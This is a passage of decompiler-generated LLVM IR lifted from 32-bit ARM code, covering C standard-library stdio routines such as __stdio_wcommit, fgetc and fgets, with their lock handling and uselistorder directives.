  call void @__pseudo_cond_branch(i1 %v1_181a0, i32 ptrtoint (i32* @global_var_181d8.825 to i32))
  %v0_181a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_181a4 = add i32 %v0_181a4, 32
  %storemerge.in = inttoptr i32 %v1_181a4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_181a8 = icmp eq i32 %storemerge, 0
  br i1 %v2_181a8, label %dec_label_pc_181b0, label %dec_label_pc_18194

dec_label_pc_181b0:                               ; preds = %dec_label_pc_181a8, %dec_label_pc_18184
  %v2_181b4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_181b4, i32* %r4.global-to-local, align 4
  %v1_181b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_181b8

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_1816c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1810c, { 1, 0 }
  uselistorder i32 %v4_180cc, { 2, 1, 0 }
  uselistorder i32 %v4_1809c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 6, 7, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_181a8, { 1, 0 }
  uselistorder label %dec_label_pc_18194, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1812c, { 1, 0 }
  uselistorder label %dec_label_pc_18108, { 1, 0 }
  uselistorder label %dec_label_pc_180e8, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_181d8 = load i32, i32* @r4, align 4
  store i32 %v3_181d8, i32* %stack_var_-8, align 4
  %v1_181dc = add i32 %arg1, 8
  %v2_181dc = inttoptr i32 %v1_181dc to i32*
  %v3_181dc = load i32, i32* %v2_181dc, align 4
  %v1_181e0 = add i32 %arg1, 16
  %v2_181e0 = inttoptr i32 %v1_181e0 to i32*
  %v3_181e0 = load i32, i32* %v2_181e0, align 4
  %v9_181e4 = icmp eq i32 %v3_181e0, %v3_181dc
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_181e4, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_181dc, i32* %v2_181e0, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_181f0 = xor i1 %v9_181e4, true
  call void @__pseudo_cond_branch(i1 %v1_181f0, i32 ptrtoint (i32* @global_var_19bc8.826 to i32))
  %v0_181f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_181f4 = add i32 %v0_181f4, 8
  %v2_181f4 = inttoptr i32 %v1_181f4 to i32*
  %v3_181f4 = load i32, i32* %v2_181f4, align 4
  %v1_181f8 = add i32 %v0_181f4, 16
  %v2_181f8 = inttoptr i32 %v1_181f8 to i32*
  %v3_181f8 = load i32, i32* %v2_181f8, align 4
  %v2_181fc = sub i32 %v3_181f8, %v3_181f4
  %v2_18200 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18200, i32* @r4, align 4
  ret i32 %v2_181fc

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_18208 = load i32, i32* @r4, align 4
  store i32 %v3_18208, i32* %stack_var_-20, align 4
  %v6_18208 = load i32, i32* @r5, align 4
  %v9_18208 = load i32, i32* @r6, align 4
  %v12_18208 = load i32, i32* @r7, align 4
  %v15_18208 = load i32, i32* @lr, align 4
  %v1_1820c = add i32 %arg1, 52
  %v2_1820c = inttoptr i32 %v1_1820c to i32*
  %v3_1820c = load i32, i32* %v2_1820c, align 4
  store i32 %v3_1820c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18210 = icmp eq i32 %v3_1820c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_18210, label %dec_label_pc_18244, label %dec_label_pc_18220

dec_label_pc_18220:                               ; preds = %entry
  %v1_18220 = add i32 %arg1, 16
  %v2_18220 = inttoptr i32 %v1_18220 to i32*
  %v3_18220 = load i32, i32* %v2_18220, align 4
  store i32 %v3_18220, i32* %r2.global-to-local, align 4
  %v1_18224 = add i32 %arg1, 24
  %v2_18224 = inttoptr i32 %v1_18224 to i32*
  %v3_18224 = load i32, i32* %v2_18224, align 4
  store i32 %v3_18224, i32* %r3.global-to-local, align 4
  %v3_18228 = icmp uge i32 %v3_18220, %v3_18224
  store i1 %v3_18228, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_18228, label %dec_label_pc_18238, label %.thread

.thread:                                          ; preds = %dec_label_pc_18220
  %v2_1822c = inttoptr i32 %v3_18220 to i8*
  %v3_1822c = load i8, i8* %v2_1822c, align 1
  %v4_1822c = zext i8 %v3_1822c to i32
  store i32 %v4_1822c, i32* %r5.global-to-local, align 4
  %v6_1822c = add i32 %v3_18220, 1
  store i32 %v6_1822c, i32* %r2.global-to-local, align 4
  store i32 %v6_1822c, i32* %v2_18220, align 4
  br label %dec_label_pc_1833c

dec_label_pc_18238:                               ; preds = %dec_label_pc_18220
  %v1_18238 = inttoptr i32 %arg1 to i16*
  %v2_18238 = call i32 @getc_unlocked(i16* %v1_18238)
  store i32 %v2_18238, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1833c

dec_label_pc_18244:                               ; preds = %entry
  %v0_18244 = call i32 @__aeabi_read_tp()
  %v0_18248 = load i32, i32* @r7, align 4
  %v1_18248 = add i32 %v0_18248, 64
  %v2_18248 = inttoptr i32 %v1_18248 to i32*
  %v3_18248 = load i32, i32* %v2_18248, align 4
  store i32 %v3_18248, i32* %r3.global-to-local, align 4
  %v1_1824c = add i32 %v0_18244, -1168
  store i32 %v1_1824c, i32* @r6, align 4
  %v3_18250 = icmp uge i32 %v3_18248, %v1_1824c
  store i1 %v3_18250, i1* %cpsr_c.global-to-local, align 1
  %v9_18250 = icmp eq i32 %v3_18248, %v1_1824c
  br i1 %v9_18250, label %dec_label_pc_18298, label %dec_label_pc_18258

dec_label_pc_18258:                               ; preds = %dec_label_pc_18244
  %v1_18258 = add i32 %v0_18248, 56
  store i32 %v1_18258, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_18258, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18264

dec_label_pc_18264:                               ; preds = %dec_label_pc_18270.dec_label_pc_18264_crit_edge, %dec_label_pc_18258
  %v0_18264 = phi i32 [ %v0_18264.pre, %dec_label_pc_18270.dec_label_pc_18264_crit_edge ], [ %v1_18258, %dec_label_pc_18258 ]
  %v1_18264 = inttoptr i32 %v0_18264 to i32*
  %v2_18264 = load i32, i32* %v1_18264, align 4
  store i32 %v2_18264, i32* %r3.global-to-local, align 4
  %v1_18268 = load i32, i32* @r4, align 4
  %v3_18268 = icmp uge i32 %v2_18264, %v1_18268
  store i1 %v3_18268, i1* %cpsr_c.global-to-local, align 1
  %v9_18268 = icmp eq i32 %v2_18264, %v1_18268
  br i1 %v9_18268, label %dec_label_pc_18270, label %dec_label_pc_18288

dec_label_pc_18270:                               ; preds = %dec_label_pc_18264
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18280 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18280, label %dec_label_pc_18284, label %dec_label_pc_18270.dec_label_pc_18264_crit_edge

dec_label_pc_18270.dec_label_pc_18264_crit_edge:  ; preds = %dec_label_pc_18270
  %v0_18264.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18264

dec_label_pc_18284:                               ; preds = %dec_label_pc_18270
  %v0_18284 = load i32, i32* @r4, align 4
  store i32 %v0_18284, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18288

dec_label_pc_18288:                               ; preds = %dec_label_pc_18264, %dec_label_pc_18284
  %v0_18288 = phi i32 [ %v0_18284, %dec_label_pc_18284 ], [ %v2_18264, %dec_label_pc_18264 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18288 = icmp eq i32 %v0_18288, 0
  br i1 %v2_18288, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_18288
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_18288, %bb
  store i32 98964, i32* @lr, align 4
  %v1_18290 = xor i1 %v2_18288, true
  call void @__pseudo_cond_branch(i1 %v1_18290, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_18294 = load i32, i32* @r6, align 4
  %v1_18294 = load i32, i32* @r7, align 4
  %v2_18294 = add i32 %v1_18294, 64
  %v3_18294 = inttoptr i32 %v2_18294 to i32*
  store i32 %v0_18294, i32* %v3_18294, align 4
  %v0_18298.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18298

dec_label_pc_18298:                               ; preds = %dec_label_pc_18244, %bb18
  %v1_182a8 = phi i32 [ %v0_18248, %dec_label_pc_18244 ], [ %v0_18298.pre, %bb18 ]
  %v1_18298 = add i32 %v1_182a8, 60
  %v2_18298 = inttoptr i32 %v1_18298 to i32*
  %v3_18298 = load i32, i32* %v2_18298, align 4
  store i32 %v3_18298, i32* %r2.global-to-local, align 4
  %v1_1829c = add i32 %v1_182a8, 16
  %v2_1829c = inttoptr i32 %v1_1829c to i32*
  %v3_1829c = load i32, i32* %v2_1829c, align 4
  store i32 %v3_1829c, i32* %r1.global-to-local, align 4
  %v1_182a0 = add i32 %v1_182a8, 24
  %v2_182a0 = inttoptr i32 %v1_182a0 to i32*
  %v3_182a0 = load i32, i32* %v2_182a0, align 4
  store i32 %v3_182a0, i32* %r3.global-to-local, align 4
  %v1_182a4 = add i32 %v3_18298, 1
  store i32 %v1_182a4, i32* %r2.global-to-local, align 4
  store i32 %v1_182a4, i32* %v2_18298, align 4
  %v0_182ac = load i32, i32* %r1.global-to-local, align 4
  %v1_182ac = load i32, i32* %r3.global-to-local, align 4
  %v3_182ac = icmp uge i32 %v0_182ac, %v1_182ac
  store i1 %v3_182ac, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_182ac, label %dec_label_pc_182bc, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18298
  %v2_182b0 = inttoptr i32 %v0_182ac to i8*
  %v3_182b0 = load i8, i8* %v2_182b0, align 1
  %v4_182b0 = zext i8 %v3_182b0 to i32
  store i32 %v4_182b0, i32* %r5.global-to-local, align 4
  %v6_182b0 = add i32 %v0_182ac, 1
  store i32 %v6_182b0, i32* %r1.global-to-local, align 4
  %v2_182b4 = load i32, i32* @r7, align 4
  %v3_182b4 = add i32 %v2_182b4, 16
  %v4_182b4 = inttoptr i32 %v3_182b4 to i32*
  store i32 %v6_182b0, i32* %v4_182b4, align 4
  br label %dec_label_pc_182c8

dec_label_pc_182bc:                               ; preds = %dec_label_pc_18298
  %v0_182bc = load i32, i32* @r7, align 4
  %v1_182c0 = inttoptr i32 %v0_182bc to i16*
  %v2_182c0 = call i32 @getc_unlocked(i16* %v1_182c0)
  store i32 %v2_182c0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_182c8

dec_label_pc_182c8:                               ; preds = %.thread2, %dec_label_pc_182bc
  %v0_182c8 = load i32, i32* @r7, align 4
  %v1_182c8 = add i32 %v0_182c8, 60
  %v2_182c8 = inttoptr i32 %v1_182c8 to i32*
  %v3_182c8 = load i32, i32* %v2_182c8, align 4
  %v1_182cc = add i32 %v3_182c8, -1
  store i32 %v1_182cc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_182d0 = icmp eq i32 %v1_182cc, 0
  store i32 %v1_182cc, i32* %v2_182c8, align 4
  br i1 %v2_182d0, label %dec_label_pc_182dc, label %dec_label_pc_1833c

dec_label_pc_182dc:                               ; preds = %dec_label_pc_182c8
  %v0_182dc = load i32, i32* %r3.global-to-local, align 4
  %v1_182dc = load i32, i32* @r7, align 4
  %v2_182dc = add i32 %v1_182dc, 64
  %v3_182dc = inttoptr i32 %v2_182dc to i32*
  store i32 %v0_182dc, i32* %v3_182dc, align 4
  %v0_182e0 = load i32, i32* @r7, align 4
  %v1_182e0 = add i32 %v0_182e0, 56
  store i32 %v1_182e0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_182e4

dec_label_pc_182e4:                               ; preds = %dec_label_pc_18314.dec_label_pc_182e4_crit_edge, %dec_label_pc_182dc
  %v0_182ec = phi i32 [ %v0_182ec.pre, %dec_label_pc_18314.dec_label_pc_182e4_crit_edge ], [ %v1_182e0, %dec_label_pc_182dc ]
  %v0_182e4 = phi i32 [ %v0_182e4.pre, %dec_label_pc_18314.dec_label_pc_182e4_crit_edge ], [ %v0_182e0, %dec_label_pc_182dc ]
  %v1_182e4 = add i32 %v0_182e4, 56
  %v2_182e4 = inttoptr i32 %v1_182e4 to i32*
  %v3_182e4 = load i32, i32* %v2_182e4, align 4
  store i32 %v3_182e4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_182ec, i32* %r2.global-to-local, align 4
  %v1_182f022 = inttoptr i32 %v0_182ec to i32*
  %v2_182f023 = load i32, i32* %v1_182f022, align 4
  store i32 %v2_182f023, i32* %r3.global-to-local, align 4
  %v3_182f425 = icmp uge i32 %v2_182f023, %v3_182e4
  store i1 %v3_182f425, i1* %cpsr_c.global-to-local, align 1
  %v9_182f431 = icmp eq i32 %v2_182f023, %v3_182e4
  br i1 %v9_182f431, label %dec_label_pc_182fc, label %dec_label_pc_18314

dec_label_pc_182fc:                               ; preds = %dec_label_pc_182e4, %dec_label_pc_182fc.dec_label_pc_182f0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1830c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1830c, label %dec_label_pc_18310, label %dec_label_pc_182fc.dec_label_pc_182f0_crit_edge

dec_label_pc_182fc.dec_label_pc_182f0_crit_edge:  ; preds = %dec_label_pc_182fc
  %v0_182f0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_182f4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_182f0 = inttoptr i32 %v0_182f0.pre to i32*
  %v2_182f0 = load i32, i32* %v1_182f0, align 4
  store i32 %v2_182f0, i32* %r3.global-to-local, align 4
  %v3_182f4 = icmp uge i32 %v2_182f0, %v1_182f4.pre
  store i1 %v3_182f4, i1* %cpsr_c.global-to-local, align 1
  %v9_182f4 = icmp eq i32 %v2_182f0, %v1_182f4.pre
  br i1 %v9_182f4, label %dec_label_pc_182fc, label %dec_label_pc_18314

dec_label_pc_18310:                               ; preds = %dec_label_pc_182fc
  %v0_18310 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18310, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18314

dec_label_pc_18314:                               ; preds = %dec_label_pc_182e4, %dec_label_pc_182fc.dec_label_pc_182f0_crit_edge, %dec_label_pc_18310
  %v0_1831c = phi i32 [ %v0_18310, %dec_label_pc_18310 ], [ %v2_182f023, %dec_label_pc_182e4 ], [ %v2_182f0, %dec_label_pc_182fc.dec_label_pc_182f0_crit_edge ]
  %v1_18314 = phi i32 [ %v0_18310, %dec_label_pc_18310 ], [ %v3_182e4, %dec_label_pc_182e4 ], [ %v1_182f4.pre, %dec_label_pc_182fc.dec_label_pc_182f0_crit_edge ]
  %v3_18314 = icmp uge i32 %v0_1831c, %v1_18314
  store i1 %v3_18314, i1* %cpsr_c.global-to-local, align 1
  %v9_18314 = icmp eq i32 %v0_1831c, %v1_18314
  br i1 %v9_18314, label %dec_label_pc_1831c, label %dec_label_pc_18314.dec_label_pc_182e4_crit_edge

dec_label_pc_18314.dec_label_pc_182e4_crit_edge:  ; preds = %dec_label_pc_18314
  %v0_182e4.pre = load i32, i32* @r7, align 4
  %v0_182ec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_182e4

dec_label_pc_1831c:                               ; preds = %dec_label_pc_18314
  %v2_1831c = icmp ne i32 %v1_18314, 0
  store i1 %v2_1831c, i1* %cpsr_c.global-to-local, align 1
  %v7_18320 = icmp slt i32 %v1_18314, 2
  br i1 %v7_18320, label %dec_label_pc_1833c, label %dec_label_pc_18324

dec_label_pc_18324:                               ; preds = %dec_label_pc_1831c
  %v0_18328 = load i32, i32* %r1.global-to-local, align 4
  %v1_18328 = add i32 %v0_18328, 129
  store i32 %v1_18328, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1833c

dec_label_pc_1833c:                               ; preds = %.thread, %dec_label_pc_182c8, %dec_label_pc_18324, %dec_label_pc_1831c, %dec_label_pc_18238
  %v0_1833c = load i32, i32* %r5.global-to-local, align 4
  %v2_18344 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_18344, i32* @r4, align 4
  store i32 %v6_18208, i32* @r5, align 4
  store i32 %v9_18208, i32* @r6, align 4
  store i32 %v12_18208, i32* @r7, align 4
  store i32 %v15_18208, i32* @lr, align 4
  ret i32 %v0_1833c

; uselistorder directives
  uselistorder i32 %v0_18310, { 1, 0, 2 }
  uselistorder i32 %v1_182f4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_182ac, { 1, 0, 2 }
  uselistorder i32 %v1_182a8, { 0, 2, 1 }
  uselistorder i32 %v1_18268, { 1, 0 }
  uselistorder i32 %v3_18220, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_1833c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_18314, { 2, 1, 0 }
  uselistorder label %dec_label_pc_182fc, { 1, 0 }
  uselistorder label %dec_label_pc_182c8, { 1, 0 }
  uselistorder label %dec_label_pc_18298, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_18288, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1834c = load i32, i32* @r4, align 4
  store i32 %v3_1834c, i32* %stack_var_-32, align 4
  %v6_1834c = load i32, i32* @r5, align 4
  %v9_1834c = load i32, i32* @r6, align 4
  %v12_1834c = load i32, i32* @r7, align 4
  %v15_1834c = load i32, i32* @r8, align 4
  %v24_1834c = load i32, i32* @lr, align 4
  %v1_18350 = add i32 %arg3, 52
  %v2_18350 = inttoptr i32 %v1_18350 to i32*
  %v3_18350 = load i32, i32* %v2_18350, align 4
  store i32 %v3_18350, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18354 = icmp eq i32 %v3_18350, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_18354, label %dec_label_pc_18368, label %dec_label_pc_183cc

dec_label_pc_18368:                               ; preds = %entry
  %v0_18368 = call i32 @__aeabi_read_tp()
  %v1_1836c = add i32 %arg3, 64
  %v2_1836c = inttoptr i32 %v1_1836c to i32*
  %v3_1836c = load i32, i32* %v2_1836c, align 4
  store i32 %v3_1836c, i32* %r3.global-to-local, align 4
  %v1_18370 = add i32 %v0_18368, -1168
  store i32 %v1_18370, i32* @r8, align 4
  %v3_18374 = icmp uge i32 %v3_1836c, %v1_18370
  store i1 %v3_18374, i1* %cpsr_c.global-to-local, align 1
  %v9_18374 = icmp eq i32 %v3_1836c, %v1_18370
  br i1 %v9_18374, label %dec_label_pc_183c0, label %dec_label_pc_1837c

dec_label_pc_1837c:                               ; preds = %dec_label_pc_18368
  %v1_1837c = add i32 %arg3, 56
  store i32 %v1_1837c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1837c, i32* %r2.global-to-local, align 4
  %v0_18388 = load i32, i32* @r6, align 4
  store i32 %v0_18388, i32* @r4, align 4
  %v1_1838c36 = inttoptr i32 %v1_1837c to i32*
  %v2_1838c37 = load i32, i32* %v1_1838c36, align 4
  store i32 %v2_1838c37, i32* %r3.global-to-local, align 4
  %v3_1839039 = icmp uge i32 %v2_1838c37, %v0_18388
  store i1 %v3_1839039, i1* %cpsr_c.global-to-local, align 1
  %v9_1839045 = icmp eq i32 %v2_1838c37, %v0_18388
  br i1 %v9_1839045, label %dec_label_pc_18398, label %dec_label_pc_183b0

dec_label_pc_18398:                               ; preds = %dec_label_pc_1837c, %dec_label_pc_18398.dec_label_pc_1838c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_183a8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_183a8, label %dec_label_pc_183ac, label %dec_label_pc_18398.dec_label_pc_1838c_crit_edge

dec_label_pc_18398.dec_label_pc_1838c_crit_edge:  ; preds = %dec_label_pc_18398
  %v0_1838c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18390.pre = load i32, i32* @r4, align 4
  %v1_1838c = inttoptr i32 %v0_1838c.pre to i32*
  %v2_1838c = load i32, i32* %v1_1838c, align 4
  store i32 %v2_1838c, i32* %r3.global-to-local, align 4
  %v3_18390 = icmp uge i32 %v2_1838c, %v1_18390.pre
  store i1 %v3_18390, i1* %cpsr_c.global-to-local, align 1
  %v9_18390 = icmp eq i32 %v2_1838c, %v1_18390.pre
  br i1 %v9_18390, label %dec_label_pc_18398, label %dec_label_pc_183b0

dec_label_pc_183ac:                               ; preds = %dec_label_pc_18398
  %v0_183ac = load i32, i32* @r4, align 4
  store i32 %v0_183ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_183b0

dec_label_pc_183b0:                               ; preds = %dec_label_pc_1837c, %dec_label_pc_18398.dec_label_pc_1838c_crit_edge, %dec_label_pc_183ac
  %v0_183b0 = phi i32 [ %v0_183ac, %dec_label_pc_183ac ], [ %v2_1838c37, %dec_label_pc_1837c ], [ %v2_1838c, %dec_label_pc_18398.dec_label_pc_1838c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_183b0 = icmp eq i32 %v0_183b0, 0
  br i1 %v2_183b0, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_183b0
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_183b0, %bb
  store i32 99260, i32* @lr, align 4
  %v1_183b8 = xor i1 %v2_183b0, true
  call void @__pseudo_cond_branch(i1 %v1_183b8, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_183bc = load i32, i32* @r8, align 4
  %v1_183bc = load i32, i32* @r7, align 4
  %v2_183bc = add i32 %v1_183bc, 64
  %v3_183bc = inttoptr i32 %v2_183bc to i32*
  store i32 %v0_183bc, i32* %v3_183bc, align 4
  br label %dec_label_pc_183c0

dec_label_pc_183c0:                               ; preds = %dec_label_pc_18368, %bb20
  %v0_183c0 = load i32, i32* @r7, align 4
  %v1_183c0 = add i32 %v0_183c0, 60
  %v2_183c0 = inttoptr i32 %v1_183c0 to i32*
  %v3_183c0 = load i32, i32* %v2_183c0, align 4
  %v1_183c4 = add i32 %v3_183c0, 1
  store i32 %v1_183c4, i32* %r3.global-to-local, align 4
  store i32 %v1_183c4, i32* %v2_183c0, align 4
  %v0_183cc.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_183d0.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_183d4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_183cc

dec_label_pc_183cc:                               ; preds = %entry, %dec_label_pc_183c0
  %v0_183d4 = phi i32 [ %arg3, %entry ], [ %v0_183d4.pre, %dec_label_pc_183c0 ]
  %v0_183d0 = phi i32 [ %arg2, %entry ], [ %v0_183d0.pre, %dec_label_pc_183c0 ]
  %v0_183cc = phi i32 [ %arg1, %entry ], [ %v0_183cc.pre, %dec_label_pc_183c0 ]
  store i32 %v0_183d0, i32* %r1.global-to-local, align 4
  store i32 %v0_183d4, i32* %r2.global-to-local, align 4
  %v3_183d8 = inttoptr i32 %v0_183cc to i8*
  %v4_183d8 = call i32 @__GI_fgets_unlocked(i8* %v3_183d8, i32 %v0_183d0, i32 %v0_183d4)
  %v0_183dc = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_183dc = icmp eq i32 %v0_183dc, 0
  store i32 %v4_183d8, i32* %r8.global-to-local, align 4
  br i1 %v2_183dc, label %dec_label_pc_183e8, label %dec_label_pc_1845c

dec_label_pc_183e8:                               ; preds = %dec_label_pc_183cc
  %v0_183e8 = load i32, i32* @r7, align 4
  %v1_183e8 = add i32 %v0_183e8, 60
  %v2_183e8 = inttoptr i32 %v1_183e8 to i32*
  %v3_183e8 = load i32, i32* %v2_183e8, align 4
  %v1_183ec = add i32 %v3_183e8, -1
  store i32 %v1_183ec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_183f0 = icmp eq i32 %v1_183ec, 0
  store i32 %v1_183ec, i32* %v2_183e8, align 4
  br i1 %v2_183f0, label %dec_label_pc_183fc, label %dec_label_pc_1845c

dec_label_pc_183fc:                               ; preds = %dec_label_pc_183e8
  %v0_183fc = load i32, i32* %r3.global-to-local, align 4
  %v1_183fc = load i32, i32* @r7, align 4
  %v2_183fc = add i32 %v1_183fc, 64
  %v3_183fc = inttoptr i32 %v2_183fc to i32*
  store i32 %v0_183fc, i32* %v3_183fc, align 4
  %v0_18400 = load i32, i32* @r7, align 4
  %v1_18400 = add i32 %v0_18400, 56
  store i32 %v1_18400, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18404

dec_label_pc_18404:                               ; preds = %dec_label_pc_18434.dec_label_pc_18404_crit_edge, %dec_label_pc_183fc
  %v0_1840c = phi i32 [ %v0_1840c.pre, %dec_label_pc_18434.dec_label_pc_18404_crit_edge ], [ %v1_18400, %dec_label_pc_183fc ]
  %v0_18404 = phi i32 [ %v0_18404.pre, %dec_label_pc_18434.dec_label_pc_18404_crit_edge ], [ %v0_18400, %dec_label_pc_183fc ]
  %v1_18404 = add i32 %v0_18404, 56
  %v2_18404 = inttoptr i32 %v1_18404 to i32*
  %v3_18404 = load i32, i32* %v2_18404, align 4
  store i32 %v3_18404, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1840c, i32* %r2.global-to-local, align 4
  %v1_1841024 = inttoptr i32 %v0_1840c to i32*
  %v2_1841025 = load i32, i32* %v1_1841024, align 4
  store i32 %v2_1841025, i32* %r3.global-to-local, align 4
  %v3_1841427 = icmp uge i32 %v2_1841025, %v3_18404
  store i1 %v3_1841427, i1* %cpsr_c.global-to-local, align 1
  %v9_1841433 = icmp eq i32 %v2_1841025, %v3_18404
  br i1 %v9_1841433, label %dec_label_pc_1841c, label %dec_label_pc_18434

dec_label_pc_1841c:                               ; preds = %dec_label_pc_18404, %dec_label_pc_1841c.dec_label_pc_18410_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1842c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1842c, label %dec_label_pc_18430, label %dec_label_pc_1841c.dec_label_pc_18410_crit_edge

dec_label_pc_1841c.dec_label_pc_18410_crit_edge:  ; preds = %dec_label_pc_1841c
  %v0_18410.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18414.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18410 = inttoptr i32 %v0_18410.pre to i32*
  %v2_18410 = load i32, i32* %v1_18410, align 4
  store i32 %v2_18410, i32* %r3.global-to-local, align 4
  %v3_18414 = icmp uge i32 %v2_18410, %v1_18414.pre
